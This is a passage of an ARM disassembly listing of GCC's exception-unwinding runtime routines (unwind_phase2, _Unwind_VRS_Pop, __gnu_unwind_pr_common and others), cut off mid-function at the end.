   1de44:	eb00021d 	bl	1e6c0 <__restore_core_regs>
   1de48:	e1a00005 	mov	r0, r5
   1de4c:	e59d1178 	ldr	r1, [sp, #376]	; 0x178
   1de50:	ebffff25 	bl	1daec <get_eit_entry>
   1de54:	e1a07000 	mov	r7, r0
   1de58:	eaffffc8 	b	1dd80 <unwind_phase2_forced+0x74>

0001de5c <__gnu_Unwind_ForcedUnwind>:
   1de5c:	e580100c 	str	r1, [r0, #12]
   1de60:	e5802018 	str	r2, [r0, #24]
   1de64:	e593203c 	ldr	r2, [r3, #60]	; 0x3c
   1de68:	e1a01003 	mov	r1, r3
   1de6c:	e5832040 	str	r2, [r3, #64]	; 0x40
   1de70:	e3a02000 	mov	r2, #0
   1de74:	eaffffa4 	b	1dd0c <unwind_phase2_forced>

0001de78 <unwind_phase2>:
   1de78:	e92d4030 	push	{r4, r5, lr}
   1de7c:	e1a04000 	mov	r4, r0
   1de80:	e24dd004 	sub	sp, sp, #4
   1de84:	e1a05001 	mov	r5, r1
   1de88:	e1a00004 	mov	r0, r4
   1de8c:	e5951040 	ldr	r1, [r5, #64]	; 0x40
   1de90:	ebffff15 	bl	1daec <get_eit_entry>
   1de94:	e3500000 	cmp	r0, #0
   1de98:	1a00000b 	bne	1decc <unwind_phase2+0x54>
   1de9c:	e5953040 	ldr	r3, [r5, #64]	; 0x40
   1dea0:	e3a00001 	mov	r0, #1
   1dea4:	e5843014 	str	r3, [r4, #20]
   1dea8:	e1a01004 	mov	r1, r4
   1deac:	e1a02005 	mov	r2, r5
   1deb0:	e594c010 	ldr	ip, [r4, #16]
   1deb4:	e1a0e00f 	mov	lr, pc
   1deb8:	e12fff1c 	bx	ip
   1debc:	e3500008 	cmp	r0, #8
   1dec0:	0afffff0 	beq	1de88 <unwind_phase2+0x10>
   1dec4:	e3500007 	cmp	r0, #7
   1dec8:	0a000000 	beq	1ded0 <unwind_phase2+0x58>
   1decc:	ebffe9ba 	bl	185bc <__GI_abort>
   1ded0:	e2850004 	add	r0, r5, #4
   1ded4:	eb0001f9 	bl	1e6c0 <__restore_core_regs>

0001ded8 <__gnu_Unwind_Resume>:
   1ded8:	e5902014 	ldr	r2, [r0, #20]
   1dedc:	e92d4030 	push	{r4, r5, lr}
   1dee0:	e5812040 	str	r2, [r1, #64]	; 0x40
   1dee4:	e590300c 	ldr	r3, [r0, #12]
   1dee8:	e3530000 	cmp	r3, #0
   1deec:	e24dd004 	sub	sp, sp, #4
   1def0:	e1a04000 	mov	r4, r0
   1def4:	e1a05001 	mov	r5, r1
   1def8:	1a00000e 	bne	1df38 <__gnu_Unwind_Resume+0x60>
   1defc:	e3a00002 	mov	r0, #2
   1df00:	e1a01004 	mov	r1, r4
   1df04:	e1a02005 	mov	r2, r5
   1df08:	e594c010 	ldr	ip, [r4, #16]
   1df0c:	e1a0e00f 	mov	lr, pc
   1df10:	e12fff1c 	bx	ip
   1df14:	e3500007 	cmp	r0, #7
   1df18:	0a000004 	beq	1df30 <__gnu_Unwind_Resume+0x58>
   1df1c:	e3500008 	cmp	r0, #8
   1df20:	1bffe9a5 	blne	185bc <__GI_abort>
   1df24:	e1a00004 	mov	r0, r4
   1df28:	e1a01005 	mov	r1, r5
   1df2c:	ebffffd1 	bl	1de78 <unwind_phase2>
   1df30:	e2850004 	add	r0, r5, #4
   1df34:	eb0001e1 	bl	1e6c0 <__restore_core_regs>
   1df38:	e3a02001 	mov	r2, #1
   1df3c:	ebffff72 	bl	1dd0c <unwind_phase2_forced>
   1df40:	ebffe99d 	bl	185bc <__GI_abort>

0001df44 <__gnu_Unwind_RaiseException>:
   1df44:	e92d4070 	push	{r4, r5, r6, lr}
   1df48:	e591303c 	ldr	r3, [r1, #60]	; 0x3c
   1df4c:	e5813040 	str	r3, [r1, #64]	; 0x40
   1df50:	e281e004 	add	lr, r1, #4
   1df54:	e24dde13 	sub	sp, sp, #304	; 0x130
   1df58:	e1a06001 	mov	r6, r1
   1df5c:	e1a05000 	mov	r5, r0
   1df60:	e8be000f 	ldm	lr!, {r0, r1, r2, r3}
   1df64:	e28dc004 	add	ip, sp, #4
   1df68:	e8ac000f 	stmia	ip!, {r0, r1, r2, r3}
   1df6c:	e8be000f 	ldm	lr!, {r0, r1, r2, r3}
   1df70:	e8ac000f 	stmia	ip!, {r0, r1, r2, r3}
   1df74:	e8be000f 	ldm	lr!, {r0, r1, r2, r3}
   1df78:	e8ac000f 	stmia	ip!, {r0, r1, r2, r3}
   1df7c:	e89e000f 	ldm	lr, {r0, r1, r2, r3}
   1df80:	e88c000f 	stm	ip, {r0, r1, r2, r3}
   1df84:	e3e03000 	mvn	r3, #0
   1df88:	e58d3000 	str	r3, [sp]
   1df8c:	e1a00005 	mov	r0, r5
   1df90:	e59d1040 	ldr	r1, [sp, #64]	; 0x40
   1df94:	ebfffed4 	bl	1daec <get_eit_entry>
   1df98:	e3500000 	cmp	r0, #0
   1df9c:	1a00000c 	bne	1dfd4 <__gnu_Unwind_RaiseException+0x90>
   1dfa0:	e1a01005 	mov	r1, r5
   1dfa4:	e1a0200d 	mov	r2, sp
   1dfa8:	e595c010 	ldr	ip, [r5, #16]
   1dfac:	e1a0e00f 	mov	lr, pc
   1dfb0:	e12fff1c 	bx	ip
   1dfb4:	e3500008 	cmp	r0, #8
   1dfb8:	e1a04000 	mov	r4, r0
   1dfbc:	0afffff2 	beq	1df8c <__gnu_Unwind_RaiseException+0x48>
   1dfc0:	e59d3000 	ldr	r3, [sp]
   1dfc4:	e3130001 	tst	r3, #1
   1dfc8:	0a000005 	beq	1dfe4 <__gnu_Unwind_RaiseException+0xa0>
   1dfcc:	e3540006 	cmp	r4, #6
   1dfd0:	0a000006 	beq	1dff0 <__gnu_Unwind_RaiseException+0xac>
   1dfd4:	e3a00009 	mov	r0, #9
   1dfd8:	e28dde13 	add	sp, sp, #304	; 0x130
   1dfdc:	e8bd4070 	pop	{r4, r5, r6, lr}
   1dfe0:	e12fff1e 	bx	lr
   1dfe4:	e28d0048 	add	r0, sp, #72	; 0x48
   1dfe8:	eb0001bb 	bl	1e6dc <__gnu_Unwind_Restore_VFP>
   1dfec:	eafffff6 	b	1dfcc <__gnu_Unwind_RaiseException+0x88>
   1dff0:	e1a00005 	mov	r0, r5
   1dff4:	e1a01006 	mov	r1, r6
   1dff8:	ebffff9e 	bl	1de78 <unwind_phase2>

0001dffc <__gnu_Unwind_Resume_or_Rethrow>:
   1dffc:	e590300c 	ldr	r3, [r0, #12]
   1e000:	e3530000 	cmp	r3, #0
   1e004:	1a000000 	bne	1e00c <__gnu_Unwind_Resume_or_Rethrow+0x10>
   1e008:	eaffffcd 	b	1df44 <__gnu_Unwind_RaiseException>
   1e00c:	e591303c 	ldr	r3, [r1, #60]	; 0x3c
   1e010:	e3a02000 	mov	r2, #0
   1e014:	e5813040 	str	r3, [r1, #64]	; 0x40
   1e018:	eaffff3b 	b	1dd0c <unwind_phase2_forced>

0001e01c <_Unwind_VRS_Pop>:
   1e01c:	e92d45f0 	push	{r4, r5, r6, r7, r8, sl, lr}
   1e020:	e1a04000 	mov	r4, r0
   1e024:	e24dd08c 	sub	sp, sp, #140	; 0x8c
   1e028:	e1a05003 	mov	r5, r3
   1e02c:	e3510004 	cmp	r1, #4
   1e030:	908ff101 	addls	pc, pc, r1, lsl #2
   1e034:	ea00000f 	b	1e078 <_Unwind_VRS_Pop+0x5c>
   1e038:	ea000014 	b	1e090 <_Unwind_VRS_Pop+0x74>
   1e03c:	ea000002 	b	1e04c <_Unwind_VRS_Pop+0x30>
   1e040:	ea000010 	b	1e088 <_Unwind_VRS_Pop+0x6c>
   1e044:	ea00000f 	b	1e088 <_Unwind_VRS_Pop+0x6c>
   1e048:	ea00000e 	b	1e088 <_Unwind_VRS_Pop+0x6c>
   1e04c:	e3530001 	cmp	r3, #1
   1e050:	13530005 	cmpne	r3, #5
   1e054:	03a0a000 	moveq	sl, #0
   1e058:	13a0a001 	movne	sl, #1
   1e05c:	1a000005 	bne	1e078 <_Unwind_VRS_Pop+0x5c>
   1e060:	e1a06802 	lsl	r6, r2, #16
   1e064:	e1a06826 	lsr	r6, r6, #16
   1e068:	e1a07822 	lsr	r7, r2, #16
   1e06c:	e0863007 	add	r3, r6, r7
   1e070:	e3530010 	cmp	r3, #16
   1e074:	9a000018 	bls	1e0dc <_Unwind_VRS_Pop+0xc0>
   1e078:	e3a00002 	mov	r0, #2
   1e07c:	e28dd08c 	add	sp, sp, #140	; 0x8c
   1e080:	e8bd45f0 	pop	{r4, r5, r6, r7, r8, sl, lr}
   1e084:	e12fff1e 	bx	lr
   1e088:	e3a00001 	mov	r0, #1
   1e08c:	eafffffa 	b	1e07c <_Unwind_VRS_Pop+0x60>
   1e090:	e3530000 	cmp	r3, #0
   1e094:	1afffff7 	bne	1e078 <_Unwind_VRS_Pop+0x5c>
   1e098:	e1a00802 	lsl	r0, r2, #16
   1e09c:	e594c038 	ldr	ip, [r4, #56]	; 0x38
   1e0a0:	e1a00820 	lsr	r0, r0, #16
   1e0a4:	e1a01003 	mov	r1, r3
   1e0a8:	e3a03001 	mov	r3, #1
   1e0ac:	e0103113 	ands	r3, r0, r3, lsl r1
   1e0b0:	e1a02101 	lsl	r2, r1, #2
   1e0b4:	149c3004 	ldrne	r3, [ip], #4
   1e0b8:	e2811001 	add	r1, r1, #1
   1e0bc:	e0842002 	add	r2, r4, r2
   1e0c0:	15823004 	strne	r3, [r2, #4]
   1e0c4:	e3510010 	cmp	r1, #16
   1e0c8:	1afffff6 	bne	1e0a8 <_Unwind_VRS_Pop+0x8c>
   1e0cc:	e2100a02 	ands	r0, r0, #8192	; 0x2000
   1e0d0:	0584c038 	streq	ip, [r4, #56]	; 0x38
   1e0d4:	13a00000 	movne	r0, #0
   1e0d8:	eaffffe7 	b	1e07c <_Unwind_VRS_Pop+0x60>
   1e0dc:	e5903000 	ldr	r3, [r0]
   1e0e0:	e3130001 	tst	r3, #1
   1e0e4:	1a000018 	bne	1e14c <_Unwind_VRS_Pop+0x130>
   1e0e8:	e1a0000d 	mov	r0, sp
   1e0ec:	eb00017c 	bl	1e6e4 <__gnu_Unwind_Save_VFP>
   1e0f0:	e1b0e086 	lsls	lr, r6, #1
   1e0f4:	e1a0800d 	mov	r8, sp
   1e0f8:	e594c038 	ldr	ip, [r4, #56]	; 0x38
   1e0fc:	0a00000b 	beq	1e130 <_Unwind_VRS_Pop+0x114>
   1e100:	e1a03187 	lsl	r3, r7, #3
   1e104:	e1a0000a 	mov	r0, sl
   1e108:	e08d2003 	add	r2, sp, r3
   1e10c:	e1a0100a 	mov	r1, sl
   1e110:	e79c3001 	ldr	r3, [ip, r1]
   1e114:	e2800001 	add	r0, r0, #1
   1e118:	e150000e 	cmp	r0, lr
   1e11c:	e7813002 	str	r3, [r1, r2]
   1e120:	e2811004 	add	r1, r1, #4
   1e124:	1afffff9 	bne	1e110 <_Unwind_VRS_Pop+0xf4>
   1e128:	e1a0310e 	lsl	r3, lr, #2
   1e12c:	e08cc003 	add	ip, ip, r3
   1e130:	e3550001 	cmp	r5, #1
   1e134:	028cc004 	addeq	ip, ip, #4
   1e138:	e1a0000d 	mov	r0, sp
   1e13c:	e584c038 	str	ip, [r4, #56]	; 0x38
   1e140:	eb000165 	bl	1e6dc <__gnu_Unwind_Restore_VFP>
   1e144:	e3a00000 	mov	r0, #0
   1e148:	eaffffcb 	b	1e07c <_Unwind_VRS_Pop+0x60>
   1e14c:	e3c33001 	bic	r3, r3, #1
   1e150:	e5803000 	str	r3, [r0]
   1e154:	e2800048 	add	r0, r0, #72	; 0x48
   1e158:	eb000161 	bl	1e6e4 <__gnu_Unwind_Save_VFP>
   1e15c:	eaffffe1 	b	1e0e8 <_Unwind_VRS_Pop+0xcc>

0001e160 <__gnu_unwind_pr_common>:
   1e160:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   1e164:	e59fc52c 	ldr	ip, [pc, #1324]	; 1e698 <__gnu_unwind_pr_common+0x538>
   1e168:	e24dd044 	sub	sp, sp, #68	; 0x44
   1e16c:	e58dc014 	str	ip, [sp, #20]
   1e170:	e3530000 	cmp	r3, #0
   1e174:	e1a08001 	mov	r8, r1
   1e178:	e591104c 	ldr	r1, [r1, #76]	; 0x4c
   1e17c:	e58d3018 	str	r3, [sp, #24]
   1e180:	e59d3014 	ldr	r3, [sp, #20]
   1e184:	e491e004 	ldr	lr, [r1], #4
   1e188:	e08f3003 	add	r3, pc, r3
   1e18c:	e1a0b002 	mov	fp, r2
   1e190:	e2002003 	and	r2, r0, #3
   1e194:	e2000008 	and	r0, r0, #8
   1e198:	e58d3014 	str	r3, [sp, #20]
   1e19c:	e1a0c001 	mov	ip, r1
   1e1a0:	e58d2024 	str	r2, [sp, #36]	; 0x24
   1e1a4:	e58de02c 	str	lr, [sp, #44]	; 0x2c
   1e1a8:	e58d1030 	str	r1, [sp, #48]	; 0x30
   1e1ac:	e58d0020 	str	r0, [sp, #32]
   1e1b0:	1a0000b6 	bne	1e490 <__gnu_unwind_pr_common+0x330>
   1e1b4:	e1a0340e 	lsl	r3, lr, #8
   1e1b8:	e58d302c 	str	r3, [sp, #44]	; 0x2c
   1e1bc:	e59d3018 	ldr	r3, [sp, #24]
   1e1c0:	e3a02003 	mov	r2, #3
   1e1c4:	e5cd2034 	strb	r2, [sp, #52]	; 0x34
   1e1c8:	e5cd3035 	strb	r3, [sp, #53]	; 0x35
   1e1cc:	e59d2024 	ldr	r2, [sp, #36]	; 0x24
   1e1d0:	e5983050 	ldr	r3, [r8, #80]	; 0x50
   1e1d4:	e3520002 	cmp	r2, #2
   1e1d8:	0598c038 	ldreq	ip, [r8, #56]	; 0x38
   1e1dc:	e2133001 	ands	r3, r3, #1
   1e1e0:	13a03000 	movne	r3, #0
   1e1e4:	158d301c 	strne	r3, [sp, #28]
   1e1e8:	058d301c 	streq	r3, [sp, #28]
   1e1ec:	1a00002f 	bne	1e2b0 <__gnu_unwind_pr_common+0x150>
   1e1f0:	e59c3000 	ldr	r3, [ip]
   1e1f4:	e3530000 	cmp	r3, #0
   1e1f8:	0a00002c 	beq	1e2b0 <__gnu_unwind_pr_common+0x150>
   1e1fc:	e59d2018 	ldr	r2, [sp, #24]
   1e200:	e3520002 	cmp	r2, #2
   1e204:	059c5004 	ldreq	r5, [ip, #4]
   1e208:	11dc50b2 	ldrhne	r5, [ip, #2]
   1e20c:	01a06003 	moveq	r6, r3
   1e210:	e598e048 	ldr	lr, [r8, #72]	; 0x48
   1e214:	e28d3038 	add	r3, sp, #56	; 0x38
   1e218:	11dc60b0 	ldrhne	r6, [ip]
   1e21c:	028c7008 	addeq	r7, ip, #8
   1e220:	128c7004 	addne	r7, ip, #4
   1e224:	e58d300c 	str	r3, [sp, #12]
   1e228:	e3c5c001 	bic	ip, r5, #1
   1e22c:	e08c400e 	add	r4, ip, lr
   1e230:	e3a01000 	mov	r1, #0
   1e234:	e59dc00c 	ldr	ip, [sp, #12]
   1e238:	e3a0200f 	mov	r2, #15
   1e23c:	e1a0000b 	mov	r0, fp
   1e240:	e1a03001 	mov	r3, r1
   1e244:	e58dc000 	str	ip, [sp]
   1e248:	ebfffded 	bl	1da04 <_Unwind_VRS_Get>
   1e24c:	e59d2038 	ldr	r2, [sp, #56]	; 0x38
   1e250:	e1540002 	cmp	r4, r2
   1e254:	83a0c000 	movhi	ip, #0
   1e258:	8a000004 	bhi	1e270 <__gnu_unwind_pr_common+0x110>
   1e25c:	e3c63001 	bic	r3, r6, #1
   1e260:	e0843003 	add	r3, r4, r3
   1e264:	e1520003 	cmp	r2, r3
   1e268:	23a0c000 	movcs	ip, #0
   1e26c:	33a0c001 	movcc	ip, #1
   1e270:	e2052001 	and	r2, r5, #1
   1e274:	e2063001 	and	r3, r6, #1
   1e278:	e1832082 	orr	r2, r3, r2, lsl #1
   1e27c:	e3520001 	cmp	r2, #1
   1e280:	0a000062 	beq	1e410 <__gnu_unwind_pr_common+0x2b0>
   1e284:	2a00002b 	bcs	1e338 <__gnu_unwind_pr_common+0x1d8>
   1e288:	e59d2024 	ldr	r2, [sp, #36]	; 0x24
   1e28c:	e3520000 	cmp	r2, #0
   1e290:	03a03000 	moveq	r3, #0
   1e294:	120c3001 	andne	r3, ip, #1
   1e298:	e3530000 	cmp	r3, #0
   1e29c:	1a0000dd 	bne	1e618 <__gnu_unwind_pr_common+0x4b8>
   1e2a0:	e287c004 	add	ip, r7, #4
   1e2a4:	e59c3000 	ldr	r3, [ip]
   1e2a8:	e3530000 	cmp	r3, #0
   1e2ac:	1affffd2 	bne	1e1fc <__gnu_unwind_pr_common+0x9c>
   1e2b0:	e1a0000b 	mov	r0, fp
   1e2b4:	e28d102c 	add	r1, sp, #44	; 0x2c
   1e2b8:	eb000140 	bl	1e7c0 <__gnu_unwind_execute>
   1e2bc:	e2505000 	subs	r5, r0, #0
   1e2c0:	1a00001e 	bne	1e340 <__gnu_unwind_pr_common+0x1e0>
   1e2c4:	e59d201c 	ldr	r2, [sp, #28]
   1e2c8:	e3520000 	cmp	r2, #0
   1e2cc:	02800008 	addeq	r0, r0, #8
   1e2d0:	0a00001b 	beq	1e344 <__gnu_unwind_pr_common+0x1e4>
   1e2d4:	e28d4038 	add	r4, sp, #56	; 0x38
   1e2d8:	e1a01005 	mov	r1, r5
   1e2dc:	e3a0200f 	mov	r2, #15
   1e2e0:	e1a03005 	mov	r3, r5
   1e2e4:	e1a0000b 	mov	r0, fp
   1e2e8:	e58d4000 	str	r4, [sp]
   1e2ec:	ebfffdc4 	bl	1da04 <_Unwind_VRS_Get>
   1e2f0:	e1a01005 	mov	r1, r5
   1e2f4:	e3a0200e 	mov	r2, #14
   1e2f8:	e1a03005 	mov	r3, r5
   1e2fc:	e1a0000b 	mov	r0, fp
   1e300:	e58d4000 	str	r4, [sp]
   1e304:	ebfffdd1 	bl	1da50 <_Unwind_VRS_Set>
   1e308:	e59d2014 	ldr	r2, [sp, #20]
   1e30c:	e59f3388 	ldr	r3, [pc, #904]	; 1e69c <__gnu_unwind_pr_common+0x53c>
   1e310:	e792c003 	ldr	ip, [r2, r3]
   1e314:	e1a01005 	mov	r1, r5
   1e318:	e1a0000b 	mov	r0, fp
   1e31c:	e3a0200f 	mov	r2, #15
   1e320:	e1a03005 	mov	r3, r5
   1e324:	e58dc038 	str	ip, [sp, #56]	; 0x38
   1e328:	e58d4000 	str	r4, [sp]
   1e32c:	ebfffdc7 	bl	1da50 <_Unwind_VRS_Set>
   1e330:	e3a00007 	mov	r0, #7
   1e334:	ea000002 	b	1e344 <__gnu_unwind_pr_common+0x1e4>
   1e338:	e3520002 	cmp	r2, #2
   1e33c:	0a000003 	beq	1e350 <__gnu_unwind_pr_common+0x1f0>
   1e340:	e3a00009 	mov	r0, #9
   1e344:	e28dd044 	add	sp, sp, #68	; 0x44
   1e348:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   1e34c:	e12fff1e 	bx	lr
   1e350:	e59d2024 	ldr	r2, [sp, #36]	; 0x24
   1e354:	e5973000 	ldr	r3, [r7]
   1e358:	e3520000 	cmp	r2, #0
   1e35c:	e3c3a102 	bic	sl, r3, #-2147483648	; 0x80000000
   1e360:	1a00005a 	bne	1e4d0 <__gnu_unwind_pr_common+0x370>
   1e364:	e35c0000 	cmp	ip, #0
   1e368:	0a000052 	beq	1e4b8 <__gnu_unwind_pr_common+0x358>
   1e36c:	e59dc020 	ldr	ip, [sp, #32]
   1e370:	e35a0000 	cmp	sl, #0
   1e374:	135c0000 	cmpne	ip, #0
   1e378:	1a00004e 	bne	1e4b8 <__gnu_unwind_pr_common+0x358>
   1e37c:	e35a0000 	cmp	sl, #0
   1e380:	0a000096 	beq	1e5e0 <__gnu_unwind_pr_common+0x480>
   1e384:	e2876004 	add	r6, r7, #4
   1e388:	e59f2310 	ldr	r2, [pc, #784]	; 1e6a0 <__gnu_unwind_pr_common+0x540>
   1e38c:	e59d5024 	ldr	r5, [sp, #36]	; 0x24
   1e390:	e28d303c 	add	r3, sp, #60	; 0x3c
   1e394:	e2889058 	add	r9, r8, #88	; 0x58
   1e398:	e1a04006 	mov	r4, r6
   1e39c:	e58d2010 	str	r2, [sp, #16]
   1e3a0:	e58d3008 	str	r3, [sp, #8]
   1e3a4:	ea000003 	b	1e3b8 <__gnu_unwind_pr_common+0x258>
   1e3a8:	e2855001 	add	r5, r5, #1
   1e3ac:	e155000a 	cmp	r5, sl
   1e3b0:	e2844004 	add	r4, r4, #4
   1e3b4:	0a000089 	beq	1e5e0 <__gnu_unwind_pr_common+0x480>
   1e3b8:	e5943000 	ldr	r3, [r4]
   1e3bc:	e3530000 	cmp	r3, #0
   1e3c0:	e1a01003 	mov	r1, r3
   1e3c4:	e58d903c 	str	r9, [sp, #60]	; 0x3c
   1e3c8:	17941003 	ldrne	r1, [r4, r3]
   1e3cc:	e1a00008 	mov	r0, r8
   1e3d0:	e59d2008 	ldr	r2, [sp, #8]
   1e3d4:	e28d3010 	add	r3, sp, #16
   1e3d8:	e8931008 	ldm	r3, {r3, ip}
   1e3dc:	e79cc003 	ldr	ip, [ip, r3]
   1e3e0:	e1a0e00f 	mov	lr, pc
   1e3e4:	e12fff1c 	bx	ip
   1e3e8:	e3500000 	cmp	r0, #0
   1e3ec:	0affffed 	beq	1e3a8 <__gnu_unwind_pr_common+0x248>
   1e3f0:	e155000a 	cmp	r5, sl
   1e3f4:	0a000079 	beq	1e5e0 <__gnu_unwind_pr_common+0x480>
   1e3f8:	e5973000 	ldr	r3, [r7]
   1e3fc:	e3530000 	cmp	r3, #0
   1e400:	aa00002f 	bge	1e4c4 <__gnu_unwind_pr_common+0x364>
   1e404:	e1a00006 	mov	r0, r6
   1e408:	e2806004 	add	r6, r0, #4
   1e40c:	ea00002c 	b	1e4c4 <__gnu_unwind_pr_common+0x364>
   1e410:	e59d2024 	ldr	r2, [sp, #36]	; 0x24
   1e414:	e3520000 	cmp	r2, #0
   1e418:	1a00003a 	bne	1e508 <__gnu_unwind_pr_common+0x3a8>
   1e41c:	e35c0000 	cmp	ip, #0
   1e420:	0a000018 	beq	1e488 <__gnu_unwind_pr_common+0x328>
   1e424:	e5971004 	ldr	r1, [r7, #4]
   1e428:	e3710002 	cmn	r1, #2
   1e42c:	e2872004 	add	r2, r7, #4
   1e430:	0affffc2 	beq	1e340 <__gnu_unwind_pr_common+0x1e0>
   1e434:	e2883058 	add	r3, r8, #88	; 0x58
   1e438:	e3710001 	cmn	r1, #1
   1e43c:	e58d303c 	str	r3, [sp, #60]	; 0x3c
   1e440:	0a00000d 	beq	1e47c <__gnu_unwind_pr_common+0x31c>
   1e444:	e59f3254 	ldr	r3, [pc, #596]	; 1e6a0 <__gnu_unwind_pr_common+0x540>
   1e448:	e3510000 	cmp	r1, #0
   1e44c:	17911002 	ldrne	r1, [r1, r2]
   1e450:	059d1024 	ldreq	r1, [sp, #36]	; 0x24
   1e454:	e1a00008 	mov	r0, r8
   1e458:	e28d203c 	add	r2, sp, #60	; 0x3c
   1e45c:	e58d3010 	str	r3, [sp, #16]
   1e460:	e59dc014 	ldr	ip, [sp, #20]
   1e464:	e79cc003 	ldr	ip, [ip, r3]
   1e468:	e1a0e00f 	mov	lr, pc
   1e46c:	e12fff1c 	bx	ip
   1e470:	e3500000 	cmp	r0, #0
   1e474:	058d003c 	streq	r0, [sp, #60]	; 0x3c
   1e478:	0a000002 	beq	1e488 <__gnu_unwind_pr_common+0x328>
   1e47c:	e59d303c 	ldr	r3, [sp, #60]	; 0x3c
   1e480:	e3530000 	cmp	r3, #0
   1e484:	1a000055 	bne	1e5e0 <__gnu_unwind_pr_common+0x480>
   1e488:	e287c008 	add	ip, r7, #8
   1e48c:	eaffff57 	b	1e1f0 <__gnu_unwind_pr_common+0x90>
   1e490:	e1a0382e 	lsr	r3, lr, #16
   1e494:	e5cd3035 	strb	r3, [sp, #53]	; 0x35
   1e498:	e5dd1035 	ldrb	r1, [sp, #53]	; 0x35
   1e49c:	e3a02002 	mov	r2, #2
   1e4a0:	e1a01211 	lsl	r1, r1, r2
   1e4a4:	e1a0380e 	lsl	r3, lr, #16
   1e4a8:	e08cc001 	add	ip, ip, r1
   1e4ac:	e58d302c 	str	r3, [sp, #44]	; 0x2c
   1e4b0:	e5cd2034 	strb	r2, [sp, #52]	; 0x34
   1e4b4:	eaffff44 	b	1e1cc <__gnu_unwind_pr_common+0x6c>
   1e4b8:	e2876004 	add	r6, r7, #4
   1e4bc:	e3530000 	cmp	r3, #0
   1e4c0:	baffffcf 	blt	1e404 <__gnu_unwind_pr_common+0x2a4>
   1e4c4:	e1a0310a 	lsl	r3, sl, #2
   1e4c8:	e086c003 	add	ip, r6, r3
   1e4cc:	eaffff47 	b	1e1f0 <__gnu_unwind_pr_common+0x90>
   1e4d0:	e59dc00c 	ldr	ip, [sp, #12]
   1e4d4:	e3a01000 	mov	r1, #0
   1e4d8:	e58dc000 	str	ip, [sp]
   1e4dc:	e1a03001 	mov	r3, r1
   1e4e0:	e1a0000b 	mov	r0, fp
   1e4e4:	e3a0200d 	mov	r2, #13
   1e4e8:	e5984020 	ldr	r4, [r8, #32]
   1e4ec:	ebfffd44 	bl	1da04 <_Unwind_VRS_Get>
   1e4f0:	e59d3038 	ldr	r3, [sp, #56]	; 0x38
   1e4f4:	e1540003 	cmp	r4, r3
   1e4f8:	0a000027 	beq	1e59c <__gnu_unwind_pr_common+0x43c>
   1e4fc:	e4973004 	ldr	r3, [r7], #4
   1e500:	e1a06007 	mov	r6, r7
   1e504:	eaffffec 	b	1e4bc <__gnu_unwind_pr_common+0x35c>
   1e508:	e59dc00c 	ldr	ip, [sp, #12]
   1e50c:	e3a01000 	mov	r1, #0
   1e510:	e58dc000 	str	ip, [sp]
   1e514:	e1a03001 	mov	r3, r1
   1e518:	e1a0000b 	mov	r0, fp
   1e51c:	e3a0200d 	mov	r2, #13
   1e520:	e5984020 	ldr	r4, [r8, #32]
   1e524:	ebfffd36 	bl	1da04 <_Unwind_VRS_Get>
   1e528:	e59d3038 	ldr	r3, [sp, #56]	; 0x38
   1e52c:	e1540003 	cmp	r4, r3
   1e530:	1affffd4 	bne	1e488 <__gnu_unwind_pr_common+0x328>
   1e534:	e5983028 	ldr	r3, [r8, #40]	; 0x28
   1e538:	e1530007 	cmp	r3, r7
   1e53c:	1affffd1 	bne	1e488 <__gnu_unwind_pr_common+0x328>
   1e540:	e5971000 	ldr	r1, [r7]
   1e544:	e3110101 	tst	r1, #1073741824	; 0x40000000
   1e548:	1381c102 	orrne	ip, r1, #-2147483648	; 0x80000000
   1e54c:	03c1c102 	biceq	ip, r1, #-2147483648	; 0x80000000
   1e550:	e08cc003 	add	ip, ip, r3
   1e554:	e3a01000 	mov	r1, #0
   1e558:	e58dc038 	str	ip, [sp, #56]	; 0x38
   1e55c:	e59dc00c 	ldr	ip, [sp, #12]
   1e560:	e1a03001 	mov	r3, r1
   1e564:	e3a0200f 	mov	r2, #15
   1e568:	e1a0000b 	mov	r0, fp
   1e56c:	e58dc000 	str	ip, [sp]
   1e570:	ebfffd36 	bl	1da50 <_Unwind_VRS_Set>
   1e574:	e3a01000 	mov	r1, #0
   1e578:	e59dc00c 	ldr	ip, [sp, #12]
   1e57c:	e1a0000b 	mov	r0, fp
   1e580:	e1a02001 	mov	r2, r1
   1e584:	e1a03001 	mov	r3, r1
   1e588:	e58d8038 	str	r8, [sp, #56]	; 0x38
   1e58c:	e58dc000 	str	ip, [sp]
   1e590:	ebfffd2e 	bl	1da50 <_Unwind_VRS_Set>
   1e594:	e3a00007 	mov	r0, #7
   1e598:	eaffff69 	b	1e344 <__gnu_unwind_pr_common+0x1e4>
   1e59c:	e5983028 	ldr	r3, [r8, #40]	; 0x28
   1e5a0:	e1530007 	cmp	r3, r7
   1e5a4:	1affffd4 	bne	1e4fc <__gnu_unwind_pr_common+0x39c>
   1e5a8:	e3a03000 	mov	r3, #0
   1e5ac:	e2870004 	add	r0, r7, #4
   1e5b0:	e3a02004 	mov	r2, #4
   1e5b4:	e588302c 	str	r3, [r8, #44]	; 0x2c
   1e5b8:	e5882030 	str	r2, [r8, #48]	; 0x30
   1e5bc:	e588a028 	str	sl, [r8, #40]	; 0x28
   1e5c0:	e5880034 	str	r0, [r8, #52]	; 0x34
   1e5c4:	e5973000 	ldr	r3, [r7]
   1e5c8:	e3530000 	cmp	r3, #0
   1e5cc:	aa00002a 	bge	1e67c <__gnu_unwind_pr_common+0x51c>
   1e5d0:	e2422003 	sub	r2, r2, #3
   1e5d4:	e2806004 	add	r6, r0, #4
   1e5d8:	e58d201c 	str	r2, [sp, #28]
   1e5dc:	eaffffb8 	b	1e4c4 <__gnu_unwind_pr_common+0x364>
   1e5e0:	e3a01000 	mov	r1, #0
   1e5e4:	e59dc00c 	ldr	ip, [sp, #12]
   1e5e8:	e3a0200d 	mov	r2, #13
   1e5ec:	e1a03001 	mov	r3, r1
   1e5f0:	e1a0000b 	mov	r0, fp
   1e5f4:	e58dc000 	str	ip, [sp]
   1e5f8:	ebfffd01 	bl	1da04 <_Unwind_VRS_Get>
   1e5fc:	e5887028 	str	r7, [r8, #40]	; 0x28
   1e600:	e59d3038 	ldr	r3, [sp, #56]	; 0x38
   1e604:	e59d203c 	ldr	r2, [sp, #60]	; 0x3c
   1e608:	e3a00006 	mov	r0, #6
   1e60c:	e5883020 	str	r3, [r8, #32]
   1e610:	e5882024 	str	r2, [r8, #36]	; 0x24
   1e614:	eaffff4a 	b	1e344 <__gnu_unwind_pr_common+0x1e4>
   1e618:	e597c000 	ldr	ip, [r7]
   1e61c:	e2873004 	add	r3, r7, #4
